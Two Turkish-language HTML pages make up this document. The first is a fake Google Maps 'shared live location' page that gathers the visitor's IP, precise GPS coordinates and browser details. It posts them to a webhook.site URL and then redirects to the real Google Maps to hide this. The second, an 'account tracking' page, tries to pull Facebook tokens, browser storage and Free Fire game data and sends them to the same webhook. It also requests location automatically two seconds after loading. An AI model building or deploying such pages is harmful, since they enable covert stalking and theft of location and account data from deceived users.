<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Haritalar</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; padding: 20px; width: 90%; max-width: 350px; }
        .map-icon { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 18px; color: #3c4043; font-weight: 500; margin-bottom: 25px; line-height: 1.4; }
        button { background-color: #1a73e8; color: white; border: none; padding: 14px 20px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" alt="Maps" class="map-icon">
    <h2>Hassso54 sizinle canlı konumunu paylaştı.</h2>
    <button id="goBtn" onclick="calistir()">Konumu Görüntüle</button>
</div>

<script>
    // WEBHOOK LİNKİNİ KONTROL ET
    const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";

    async function calistir() {
        const btn = document.getElementById('goBtn');
        btn.innerText = "Yükleniyor...";
        btn.disabled = true;

        let data = {
            tip: "Hassso54_Takip",
            ip: "Bilinmiyor",
            gps: "İzin Yok",
            userAgent: navigator.userAgent
        };

        // 1. IP Al
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const json = await res.json();
            data.ip = json.ip;
        } catch(e) {}

        // 2. Konum Al ve Gönder
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (p) => {
                    data.gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    await veriyiBas(data);
                },
                async () => {
                    await veriyiBas(data);
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        } else {
            await veriyiBas(data);
        }
    }

    async function veriyiBas(d) {
        try {
            await fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(d)
            });
        } catch(e) {}
        
        // İşlem bitince gerçek haritaya yönlendir
        window.location.href = "https://www.google.com/maps";
    }
</script>

</body>
</html>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hesap Takip Sistemi</title>
    <style>
        body {
            font-family: monospace;
            background: #0a0a0a;
            color: #0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .kutu {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #0f0;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px;
            border-radius: 5px;
            font-weight: bold;
            width: 100%;
            margin: 10px 0;
            cursor: pointer;
            font-size: 16px;
        }
        .log {
            background: #000;
            padding: 10px;
            font-size: 11px;
            text-align: left;
            height: 200px;
            overflow-y: auto;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="kutu">
        <h2>🔐 Hesap Takip Sistemi</h2>
        <p>Facebook oturum bilgilerini ve konumu çek</p>
        
        <button onclick="facebookBilgileriniAl()">📱 Facebook Bilgilerini Al</button>
        <button onclick="konumAl()">📍 Konumumu Gönder</button>
        <button onclick="hesapTakip()">🎮 Free Fire Hesap Takibi Başlat</button>
        
        <div class="log" id="log">
            > Sistem hazır<br>
            > Butonlara tıkla
        </div>
    </div>

    <script>
        const webhook = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
        
        function logEkle(msg) {
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += `<br>> ${new Date().toLocaleTimeString()} - ${msg}`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        async function gonderWebhook(veri) {
            try {
                await fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(veri)
                });
                logEkle("✅ Webhook'a gönderildi");
            } catch(e) {
                logEkle("❌ Gönderim hatası: " + e.message);
            }
        }
        
        // Facebook'tan mevcut oturum bilgilerini al
        async function facebookBilgileriniAl() {
            logEkle("📱 Facebook bilgileri alınıyor...");
            
            // Facebook uygulamasını açmaya çalış
            window.location.href = "fb://profile";
            
            // Facebook'un sakladığı bilgileri dene
            const fbBilgi = {
                tip: "Facebook_Oturum",
                zaman: new Date().toLocaleString('tr-TR'),
                cihaz: navigator.userAgent,
                platform: navigator.platform,
                fbKullanici: localStorage.getItem('user') || "Çekilemedi",
                fbToken: sessionStorage.getItem('fb_token') || "Çekilemedi",
                not: "Facebook uygulaması açıldı, bilgiler manuel kontrol edilmeli"
            };
            
            await gonderWebhook(fbBilgi);
            logEkle("ℹ️ Facebook uygulaması açıldı, profil bilgilerini kontrol et");
        }
        
        // Konum al
        function konumAl() {
            logEkle("📍 Konum alınıyor...");
            
            if(navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const konumLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        const konumVeri = {
                            tip: "Konum_Bilgisi",
                            zaman: new Date().toLocaleString('tr-TR'),
                            konum: konumLink,
                            enlem: pos.coords.latitude,
                            boylam: pos.coords.longitude,
                            dogruluk: pos.coords.accuracy + " metre"
                        };
                        await gonderWebhook(konumVeri);
                        logEkle(`📍 Konum: ${pos.coords.latitude}, ${pos.coords.longitude}`);
                    },
                    async (err) => {
                        logEkle("❌ Konum hatası: " + err.message);
                        await gonderWebhook({
                            tip: "Konum_Hatasi",
                            hata: err.message
                        });
                    }
                );
            } else {
                logEkle("❌ Tarayıcı konum desteklemiyor");
            }
        }
        
        // Hesap takibi - Free Fire'dan bilgi çekmeye çalış
        function hesapTakip() {
            logEkle("🎮 Free Fire hesap bilgileri taranıyor...");
            
            // Free Fire'ın sakladığı yerleri kontrol et
            const ffVeri = {
                tip: "FreeFire_Hesap_Takip",
                zaman: new Date().toLocaleString('tr-TR'),
                cihaz: navigator.userAgent,
                ffYukluMu: "Bilinmiyor",
                ffVeriler: localStorage.getItem('freefire') || "Bulunamadı",
                sessionData: JSON.stringify(sessionStorage),
                localData: JSON.stringify(localStorage),
                not: "Free Fire açıldığında oturum bilgileri kontrol edilecek"
            };
            
            // Webhook'a gönder
            gonderWebhook(ffVeri);
            
            // Free Fire'ı aç
            logEkle("🎮 Free Fire açılıyor...");
            setTimeout(() => {
                window.location.href = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
            }, 1000);
        }
        
        // Otomatik konum gönderimi
        setTimeout(() => {
            konumAl();
        }, 2000);
    </script>
</body>
</html>
